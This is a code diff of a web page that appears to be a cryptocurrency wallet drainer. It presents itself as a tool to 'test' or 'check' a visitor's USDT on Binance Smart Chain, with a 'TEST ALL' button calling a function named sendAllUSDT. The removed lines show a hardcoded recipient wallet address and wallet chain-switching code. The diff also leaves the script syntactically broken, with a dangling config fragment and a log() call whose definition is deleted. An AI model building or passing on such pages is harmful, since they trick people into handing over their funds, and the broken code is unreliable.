@@ -49,8 +49,8 @@
   <div class="card">
     <h2>USDT (BEP-20)</h2>
     <p>This will Test Your USDT(BEP-20) on BSC:</p>
-    <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
-    <button id="sendBtn">TEST ALL</button>
+    <p style="word-break: break-all; font-weight: bold;"></p>
+    <button id="sendBtn">Check ALL</button>
     <div id="log"></div>
   </div>
 
@@ -63,31 +63,8 @@
     ];
 
     
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"]
-    };
 
-    function log(msg) {
-      document.getElementById("log").textContent = msg;
-    }
 
-    async function switchToBSC() {
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: bscParams.chainId }]
-        });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [bscParams]
-          });
-        } else {
-          throw switchError;
-        }
-      }
-    }
 
     async function sendAllUSDT() {
       log("");
